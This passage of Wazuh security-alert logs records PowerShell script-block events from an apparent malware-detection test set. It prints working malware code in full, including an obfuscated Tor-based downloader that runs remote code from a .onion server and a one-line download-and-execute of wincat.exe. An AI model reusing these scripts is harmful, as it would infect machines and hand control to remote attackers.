1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a \"socksParentProxy=localhost:9050\" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(\"localhost:8123\");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';\r\n\r\nScriptBlock ID: c2dd14bc-9ba8-44c3-8428-a4f2ddbca858\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1604.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\\\\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex \\\"nslookup -querytype=txt $ohd 8.8.8.8\\\") -match '\\\"') -replace '\\\"', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\\\\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = \\\"Hidden\\\", \\\"System\\\", \\\"NotContentIndexed\\\";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\\\\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\\\\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\\\\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\\\\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar \\\" --Log `\\\"notice file $cvdz`\\\"\\\" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a \\\"socksParentProxy=localhost:9050\\\" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(\\\"localhost:8123\\\");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&amp;mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&amp;uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';","scriptBlockId":"c2dd14bc-9ba8-44c3-8428-a4f2ddbca858","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1604.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:57.016+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":7,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015637.617050","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:26.7191737Z","eventRecordID":"200946","processID":"1384","threadID":"10196","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',\"$env:TEMP\\wincat.exe\");Start-Process (\"$env:TEMP\\wincat.exe\")\r\n\r\nScriptBlock ID: 4e433189-618c-4130-88d9-66d9e6244f41\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1619.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',\\\"$env:TEMP\\\\wincat.exe\\\");Start-Process (\\\"$env:TEMP\\\\wincat.exe\\\")","scriptBlockId":"4e433189-618c-4130-88d9-66d9e6244f41","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1619.ps1"}}},"location":"EventChannel"}
